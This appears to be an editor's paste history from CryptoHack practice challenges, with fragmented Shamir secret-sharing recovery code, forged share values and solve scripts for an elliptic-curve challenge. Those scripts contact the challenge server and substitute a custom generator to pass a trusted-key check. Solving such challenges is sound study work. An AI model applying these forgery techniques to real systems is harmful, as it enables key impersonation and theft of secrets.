	c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051
	c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519
a340058e6599a85c71b6f0c56cd6cad1|file:///tmp/neomutt-neo-1000-2912-4677154922331635724|5|25|v|mail
	Providence
79f552f961cbf87ce35cabaa4833357e|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|1|2|v|text
	105622578433921694608307153620094961853014843078655463551374559727541051964080
c64718a2e8be161b217459f01c583172|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|24|1|V|python
	    for i in range(1, shares + 1):
5f0287d94a2eacde9ee521132e7a3761|file:///home/neo/cryptohack/rsa/exponent/johan.py|3|1|V|python
	from Crypto.Util.number import bytes_to_long, getPrime, long_to_bytes
0e2773743c025833d2c47e7caa79e7b5|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|4|48|v|python
	etPrime
97881a950b2393c68916abfe14d6c4d8|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|26|35|v|python
	coef1, byteorder='big'
f4de4e666f7109989f334ab7ea4c65b1|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|26|18|v|python
	(coef1).to_bytes()
c7cb0e1fe07f400fc3e890b53286c8d7|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|27|5|V|python
	    print(coefs)
0969ad5542d5126744efa5f5bc320f0b|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|26|18|v|python
	long_to_bytes
6c268b0ab38b5e3a371fcd34327b82cf|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|106|1|V|python
	shares = make_deterministic_shares(minimum=3, shares=7, secret=FLAG, prime=PRIME)
2b212f6e2b0ae60d39716478a52c42bc|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|37|1|V|python
	    points = [(105622578433921694608307153620094961853014843078655463551374559727541051964080, 25953768581962402292961757951905849014581503184926092726593265745485300657424)]
0dfb3482e6bf5d117af7e1d0bb042294|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|27|5|V|python
	    coefs = []
61f380d2a62e3149b4222a512c8d6b2c|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|8|1|V|python
	PRIME = 77793805322526801978326005188088213205424384389488111175220421173086192558047
ef327881c320b3ce3a61b1a3b83ca16c|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|2|1|v|python
	PRIME
03187b6999e0d9fdfb175fb81df396ba|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|29|5|V|python
	    for i in range()
d36dbc2af2a9afe9b762c32b6eb91642|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|28|5|V|python
	    print(bytes_to_long(coef))
3b58052d757da0a75dccaf646d7e7913|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|1|82|v|text
	25953768581962402292961757951905849014581503184926092726593265745485300657424)
2b8651247e72b2406c8546f9af1ac7df|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|13|1|V|python
	print(eq % n)
6c55367fe6109a5737892a17a7ee45cb|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|1|1|V|python
	n = Integer(77793805322526801978326005188088213205424384389488111175220421173086192558047)
	F = GF(n)
	
	a0 = Integer(105622578433921694608307153620094961853014843078655463551374559727541051964080)
	a1 = Integer(64311995263934872711051171790339179063502022593464622231094151482764871029049)
	# a3 = 48958816547481506542403836653403554958183055834007593781387453228093060265348
	
	eq = Integer(25953768581962402292961757951905849014581503184926092726593265745485300657424)
	
	M = Matrix(F, [[a0, a1]])
	v = vector(F, (eq))
	
	sec = M.solve_right(v)
7508451e164be32b50ba72b46e767bf8|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|1|1|V|python
	n = Integer(77793805322526801978326005188088213205424384389488111175220421173086192558047)
	F = GF(n)
	R = IntegerModRing(n)
	
	a0 = Integer(105622578433921694608307153620094961853014843078655463551374559727541051964080)
	a1 = Integer(64311995263934872711051171790339179063502022593464622231094151482764871029049)
	# a3 = 48958816547481506542403836653403554958183055834007593781387453228093060265348
	
	eq = Integer(25953768581962402292961757951905849014581503184926092726593265745485300657424)
	
	M = Matrix(F, [1])
	v = vector(F, (IntegerMod(R, eq - a0 - a1)))
39eb53a93b604bc360b007f68bdfec17|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|12|16|^v|python
	(eq - a0 - a1)%n)
423cfab981c60734768a27e2f79ec6e4|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|5|1|V|python
	a0 = Integer(105622578433921694608307153620094961853014843078655463551374559727541051964080)
	a1 = Integer(64311995263934872711051171790339179063502022593464622231094151482764871029049)
b41c9ecf83aa5d45220bfcdc563789ae|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|9|1|V|python
	eq = Integer(25953768581962402292961757951905849014581503184926092726593265745485300657424)
b8da24c2d0b1cd808c97fcc20c0b8bb2|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|5|1|V|python
	a0 = Integer(105622578433921694608307153620094961853014843078655463551374559727541051964080)
	a1 = Integer(64311995263934872711051171790339179063502022593464622231094151482764871029049)
	# a3 = 48958816547481506542403836653403554958183055834007593781387453228093060265348
	eq = Integer(25953768581962402292961757951905849014581503184926092726593265745485300657424)
37afc953e1e467df71808d2e7334ae55|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|1|1|V|python
	n = Integer(77793805322526801978326005188088213205424384389488111175220421173086192558047)
75d8090f6e1c280dc8271fb18ab75260|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|112|21|v|python
	11606805529159438930255442917648134508913406291782229294565396881351762780389
f1fba62a87e590fbe0b75ee491592217|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|112|21|v|python
	76595271263891622531360321492588635703604148765083721908540058324078166880684
38c568ad8af7a5391f488821de4a8687|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|39|5|V|python
	    points = [(105622578433921694608307153620094961853014843078655463551374559727541051964080, 25953768581962402292961757951905849014581503184926092726593265745485300657424), (64311995263934872711051171790339179063502022593464622231094151482764871029049, 13629017650627355864613923458130540350828567622419349283454298588256418788920), (48958816547481506542403836653403554958183055834007593781387453228093060265348, 9892979577761660718562095994282863741131924292739322639152780013518671351692), (71163788118056250946742278462628502401208631283990591446056796500284581351358, 22538718509383822432993624312381480762962307857820310965532369225763871436797), (42594722928258326204679769853898394457579218416938502488129509102112260126866, 4493111352740597998250364553323588022037157615179856009420054103752439036187), (58522421575119377694707449857905698894744583522933905911280096179990576137862, 17774620802987125144829952588637228268086532992957263164346144251141854115435), (7581569761131076053745722312335960189535454513421855631598658902843541534861, 59591822184830038528913346111426990945410498158833901220116590515332788487048)]
c62e537359b564e41960b6478ba070cc|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|113|21|v|python
	51542578488243634887412636910087258259631340571958519954061819793523161877947
1a29610c050e5251a04d1d3a7ffe45c4|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|113|21|v|python
	5097691655372486536231920277616184324630531402410626744660750047307427544173
05d270ebdf027aabc5dddbfe427ce897|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|10|1|V|python
	print((eq - a0 - a1)%n)
920132ae039c160556cc22851bc8d97c|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|7|1|V|python
	# a3 = 48958816547481506542403836653403554958183055834007593781387453228093060265348
a2829e793383b895fd63b95be4fad336|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|11|6|V|python
	M = Matrix(F, [1])
	v = vector(F, 11606805529159438930255442917648134508913406291782229294565396881351762780389)
	
1537651edcfb9574d761ff5860e1db2b|file:///home/neo/cryptohack/misc/secret-sharing/armory.sage|11|1|V|python
	sec = M.solve_right(v)
cf5224d05c63eff07b2c6b3cb0460ec0|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|74|1|V|python
	
	def _lagrange_interpolate(x, x_s, y_s, p):
	    """
	    Find the y-value for the given x, given n (x, y) points;
	    k points will define a polynomial of up to kth order.
	    """
	    k = len(x_s)
	    assert k == len(set(x_s)), "points must be distinct"
	    def PI(vals):  # upper-case PI -- product of inputs
	        accum = 1
	        for v in vals:
	            accum *= v
	        return accum
	    nums = []  # avoid inexact division
	    dens = []
	    for i in range(k):
	        others = list(x_s)
	        cur = others.pop(i)
	        nums.append(PI(x - o for o in others))
	        dens.append(PI(cur - o for o in others))
	    den = PI(dens)
	    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)
	               for i in range(k)])
	    return (_divmod(num, den, p) + p) % p
	
	def recover_secret(shares, prime=PRIME):
	    """
	    Recover the secret from share points
	    (x, y points on the polynomial).
	    """
	    if len(shares) < 2:
	        raise ValueError("need at least two shares")
	    x_s, y_s = zip(*shares)
	    return _lagrange_interpolate(0, x_s, y_s, prime)
b18627f9480dc6bde918202e5465b2cd|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|66|1|V|python
	def _divmod(num, den, p):
	    """Compute num / den modulo prime p
	
	    To explain what this means, the return value will be such that
	    the following is true: den * _divmod(num, den, p) % p == num
	    """
	    inv, _ = _extended_gcd(den, p)
	    return num * inv
f2f3df3fdc6b8377c718609437e99b1a|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|46|1|V|python
	
	def _extended_gcd(a, b):
	    """
	    Division in integers modulus p means finding the inverse of the
	    denominator modulo p and then multiplying the numerator by this
	    inverse (Note: inverse of A is B such that A*B % p == 1) this can
	    be computed via extended Euclidean algorithm
	    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation
	    """
	    x = 0
	    last_x = 1
	    y = 1
	    last_y = 0
	    while b != 0:
	        quot = a // b
	        a, b = b, a % b
	        x, last_x = last_x - quot * x, x
	        y, last_y = last_y - quot * y, y
	    return last_x, last_y
ebfe04ca343650c91c35ffce339de557|file:///home/neo/cryptohack/misc/secret-sharing/armory.py|51|1|V|python
	secret = recover_secret(shares[1:4])
48ccf319e90aeebf64aa44057a9939a3|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|5|13|v|text
	codecrafting
a725a390c7614c5ce78ecf5c4981da85|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|1|17|v|text
	0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad407c
cf4554c3acbf49f787a162be504b430e|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|5|1|V|text
	{"sender": "me", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad407c"}
78f59d2c2c21b0430317a68b02a2c7b4|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|5|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad407c"}
d8e7dea92656cd057b6e2b60a91a0ad6|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|11|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad407b"}
26585a6fa31723a0f03d36b3631bf34e|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|7|16|v|text
	7c23e1a2741525eb1e38d432926c4c3a2d8b8b70383030a2d36e4abfa4e99c80
8469f08107122176b7021cfd9a7e2bc6|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|3|25|v|text
	8b09cfc4696b91a1cc43372ac66ca36556a41499b495f28cc7ab193e32eadd30
766a505f7ee83f6e9435a6a09428628d|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|15|v|text
	0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506b7c1f20f6ba584d49ccb1b26a6b1612909f6f5418220a9a6c398ee4b1fabffcc
eb9d7a0e85c0fd432d36a3f5d945a233|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|1|V|text
	fake_point = ''
b97df13ee42863057ee61803bbc9e958|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506b7c1f20f6ba584d49ccb1b26a6b1612909f6f5418220a9a6c398ee4b1fabffcc"}
b00a76e663070e780f9b889695ecccb5|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506d58dce5356525c41f8dfe1170eb20f7f5c2807947aec2d7aac128b483bae812c"}
4856bbf5f185aa610cf55a36d4a513e4|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|18|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad1111"}
d9ea99c8ea6b177e10d2f096ae7debbe|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|18|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c6a7e03160fbf08b4ad57e1edab1b854330f7e6afe866b90b7d5bcc9adad407a"}
72f595269a8b95de79a7a1bf8f0b6f96|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|15|1|V|text
	fake_y + rest = my_1k_wallet_privkey (mod n)
	
a5f8d5c3b1a63261801da7cfe9b883d9|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|72|v|text
	0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506d58dce5356525c41f8dfe1170eb20f7f5c2807947aec2d7aac128b483bae812c
62388fa72dc542cf45b3626ae4170386|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|10|1|V|text
	{"sender": "hyperreality", "msg": "submitting my point", "x": 5, "y": "0x1aa2374af48c61e916cc25dc2c1b88bde49df9dc25333c56ed17646fcd93f2e6506c2ee64a8e3a6559d9f52e560cdb1a28968c95c209f6cfb163ac6892a0a2cf050"}
c4c66b748524ccb25101eb50e17a8023|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|7|1|V|text
	real_secret = {"privkey":"7c23e1a2741525eb1e38d432926c4c3a2d8b8b70383030a2d36e4abfa4e99c80"}
6dd8204f955e7dfcff995a3e859b9895|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|7|1|V|text
	real_secret = {"privkey", "7c23e1a2741525eb1e38d432926c4c3a2d8b8b70383030a2d36e4abfa4e99c80"}
6937808be905718077885d6340a47770|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|7|14|v|text
	 {"privkey", "7c23e1a2741525eb1e38d432926c4c3a2d8b8b70383030a2d36e4abfa4e99c80"}
902b057ee259e6fda08f2bf045e3100c|file:///home/neo/cryptohack/misc/secret-sharing/share.txt|8|1|V|text
	{"privkey": "7c23e1a2741525eb1e38d432926c4c3a2d8b8b70383030a2d36e4abfa4e99c80"}
1a5107d8ce8fd96b3f96a3a887af9b2f|file:///home/neo/cryptohack/misc/el-gamal/source.py|28|1|V|python
	q = 117477667918738952579183719876352811442282667176975299658506388983916794266542270944999203435163206062215810775822922421123910464455461286519153688505926472313006014806485076205663018026742480181999336912300022514436004673587192018846621666145334296696433207116469994110066128730623149834083870252895489152123
	g = 104831378861792918406603185872102963672377675787070244288476520132867186367073243128721932355048896327567834691503031058630891431160772435946803430038048387919820523845278192892527138537973452950296897433212693740878617106403233353998322359462259883977147097970627584785653515124418036488904398507208057206926
1570ac023e941dfe8e0e528378d1e3e6|file:///home/neo/cryptohack/misc/el-gamal/output.txt|1|2|v|text
	public_key=0x35f4ff5a5d20b34f2792d3c8ef1593e20ea41ec6d0813cd0895a5217388385392a33ca2d85be5e4912cd6a785d137266fea393fecbbb62de6fdf4aa948c4b016be426bb86bca4ab4abd6663b8696ac4796a43b47e7e9d4a5a118f8c9a2ef9d87ec02df4528c4df7cd002f8e6ee3ee76d8d86b2f39d72078b860745887c9bc649
366c0196895c9eeaa75992bacac60426|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|9|37|v|python
	13370
b453cb8e2d598163605bbcb968ce108c|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|19|1|V|python
	eliminated = {}
	for i in range(20):
	    eliminated[i] = set()
	
	r.recvuntil('No leaks\n')
	for i in range(2000):
	    json_send({'msg': 'request'})
	    response = json_recv()
	    if 'ciphertext' in response:
	        ciphertext = base64.b64decode(response['ciphertext'])
	        for i, c in enumerate(ciphertext):
	            eliminated[i].add(c)
	
	# print(eliminated[0])
	flag = ''
	for i in range(20):
	    elim = eliminated[i]
	    for c in string.printable:
	        if ord(c) not in elim:
	            flag += c
	            break
	
	print(flag)
883765beaa3eb609c62f67eb9a0ffb99|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|16|30|v|python
	Welcome to my secure search engine backed by trusted certificate library!\n
669142caaf203cd835bcaa6fd9c8a4db|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|22|1|V|python
	g_y = 2
9786e1723fabc87de73e5970de230337|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|30|1|V|python
	                "curve": "secp256r1",
aff29b18b8d18cfa0f042dd70acc687a|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|30|27|v|python
	secp256r1
41de8832a5b7797b64faa643a29666bd|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|10|20|v|python
	[0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
d21c75bf037c55ee8ac11707c002eec3|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|10|1|V|python
	assert G.x, G.y == [0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
d5d42199bb6dce66523e8476c1501a7d|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|10|1|V|python
	assert G.x, G.y == [0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
	                    0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5]
	
	
	class Challenge():
	    def __init__(self):
	        self.before_input = "Welcome to my secure search engine backed by trusted certificate library!\n"
	        self.trusted_certs = {
	            'www.cryptohack.org': {
	                "public_key": Point(0xE9E4EBA2737E19663E993CF62DFBA4AF71C703ACA0A01CB003845178A51B859D, 0x179DF068FC5C380641DB2661121E568BB24BF13DE8A8968EF3D98CCF84DAF4A9),
	                "curve": "secp256r1",
	                "generator": [G.x, G.y]
	            },
	            'www.bing.com': {
	                "public_key": Point(0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531, 0xAB61705C502CA0F7AA127DEC096B2BBDC9BD3B4281808B3740C320810888592A),
	                "curve": "secp256r1",
	                "generator": [G.x, G.y]
	            },
	            'www.gchq.gov.uk': {
	                "public_key": Point(0xDEDFC883FEEA09DE903ECCB03C756B382B2302FFA296B03E23EEDF94B9F5AF94, 0x15CEBDD07F7584DBC7B3F4DEBBA0C13ECD2D2D8B750CBF97438AF7357CEA953D),
	                "curve": "secp256r1",
	                "generator": [G.x, G.y]
e79e2ac1184db8d0963a761945f8be5d|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|10|1|V|python
	assert G.x, G.y == [0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
	                    0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5]
21d257d50e38f7e95e38bcebe9c5b3dc|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|23|1|v|python
	assert G.x, G.y == 
95d3839c8ba10d8b87820e3fd5812972|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|24|1|V|python
	json_send({'private_key': d, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [g_x, g_y]})
a8c6bb7e0b5459de3486193ac0b5692e|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|25|1|V|python
	line = json_recv()
a0d862103025d7bade89ee010200e056|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|9|1|V|python
	r = remote('socket.cryptohack.org', 13382)
dabe6363f1e3b36ee83903fc6489c457|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|23|11|v|python
	{'private_key': d, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [g_x, g_y]})
4e664f19a6e788bcb845e7da1ca694d0|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|23|11|v|python
	{'private_key': d, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [g_x, g_y]}
839e6b833076089da00eeb978ae23530|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|21|12|v|python
	[0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296, 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5]
e17b7cd78db6827d2b4e9983a7b04f9d|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|22|1|V|python
	{'private_key': 2, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296, 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5]}
4cb07a800dc25ba43cdec5c61b53f0cf|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|10|21|v|python
	0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
9b24c67919b72040f4ef65d8f4d5f252|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|11|21|v|python
	0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5
8ce38f74dee8b0b7f940397fe92d4e9d|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|37|v|python
	0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531, 0xAB61705C502CA0F7AA127DEC096B2BBDC9BD3B4281808B3740C320810888592A),
a9edcf3be10b70c55b64e4afa25a726c|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|37|v|python
	0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531
b7d4f11c2200ee996e989b1fc6bc8015|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|25|14|V|python
	json_send({'private_key': d, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [g_x, g_y]})
	r.recvline()
913fd13ed0018209e460781d3366c436|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|105|v|python
	0xAB61705C502CA0F7AA127DEC096B2BBDC9BD3B4281808B3740C320810888592A
0799192e1969740ebac54a9c4278ca21|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|3|1|V|python
	import fastecdsa
c6662316fac5169528209ee1297e494f|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|4|1|V|python
	from fastecdsa.point import Point
1c792d7e5bc35af0f1c57905356db4d3|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|21|13|v|python
	0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
58ffece9f6a21e8a66a4876a8fcf28f4|file:///home/neo/cryptohack/elliptic-curves/sol_curveball.py|22|1|V|python
	# {'private_key': 2, 'host': 'www.bing.com', 'curve': 'secp256r1', 'generator': [0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296, 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5]}
4db8ac3de0e0e67357a28ccf3729aa6e|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|1|1|V|python
	#!/usr/bin/env python3
	
	import fastecdsa
	from fastecdsa.point import Point
c58cddac8d34151a909a9794065dfb79|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|19|31|v|python
	Point(0xE9E4EBA2737E19663E993CF62DFBA4AF71C703ACA0A01CB003845178A51B859D
2aac6818be3f43391f078e787d11e57b|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|19|31|v|python
	Point(0xE9E4EBA2737E19663E993CF62DFBA4AF71C703ACA0A01CB003845178A51B859D, 0x179DF068FC5C380641DB2661121E568BB24BF13DE8A8968EF3D98CCF84DAF4A9)
a7c64a2ea2137d4dc061136d9f5a51d8|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|14|5|V|python
	    print(d_inv)
1e3c7830299fc5d4ef3495fb225c99d5|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|23|1|V|python
	g_x, g_y = [71354560273345939556751368927153574216689468027640868102037633502409553418904,38758828378685666080563771187513326530201365226696916289511536496578706812053]
5db17bcde0370a33218dc00f0030ff07|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|15|5|V|python
	    print(fake_point * d)
7742e5e8cf936f949242d5be742c628a|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|15|1|V|python
	    fake_point = d_inv * d * P
29e59d6bfa6595ad810604741d3ff452|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|16|18|v|python
	d_inv * d * P
b10b4b978c77ea91d54d2b1d406d09f8|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|17|3|V|python
	    fake_point = P * 1
15bc8d095c82e6657a5e90f17ae2a6cc|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|11|1|V|python
	print(p)
5258424b30ead508c4c0e640ea1ca4bc|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|11|1|V|python
	p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
ec34eb632c5e2352e95749e5d284e6fa|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|12|1|V|python
	print(P)
cc0ffa4248e7d3a4531b54f61a654169|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|19|5|V|python
	    assert fake_point * d == P
f05738301c32141b9562ad2429af9651|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|15|1|V|python
	while not found:
29e3952459191504996a516aa6811988|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|7|1|V|python
	found = False
ced87c6a658b2a40ced90c31fcacb6e4|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|3|1|V|python
	import fastecdsa
	from fastecdsa.point import Point
	from sympy.core.numbers import mod_inverse
	
	P = Point(0xE9E4EBA2737E19663E993CF62DFBA4AF71C703ACA0A01CB003845178A51B859D, 0x179DF068FC5C380641DB2661121E568BB24BF13DE8A8968EF3D98CCF84DAF4A9)
	print(P)
	d = 2
	p = fastecdsa.curve.P256.p
	n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC6325
	q = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551
	
	d_inv = mod_inverse(d, q)
	fake_point = d_inv * P
	print(fake_point)
337c7cbb8064690c2f94dca325fa17ed|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|19|1|V|python
	import fastecdsa
	from fastecdsa.point import Point
	from sympy.core.numbers import mod_inverse
dc0c8b5a3ac9457163b3dc699235882f|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|24|1|V|python
	n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC6325
21785cbdbb004d1e70a8bce2b6637ce3|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|23|1|V|python
	p = fastecdsa.curve.P256.p
897c22588fbc1cc9991e3ecd87941fc5|file:///home/neo/cryptohack/elliptic-curves/signatures/calc_point.py|17|1|V|python
	print(fake_point.x)
f35463e2807f2090875f80e2702fdc8d|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|30|1|V|python
	d = 2
81309d210ad2f6d7772cebdfda444d3c|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|30|1|V|python
	g_x = 0xe8fe0b4f34312f41cadc61fe52706f3f3514c57224eddd8f3587e3a9bec1b1e8
27999b89c047356af5c23bfdaea8bf15|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|30|1|V|python
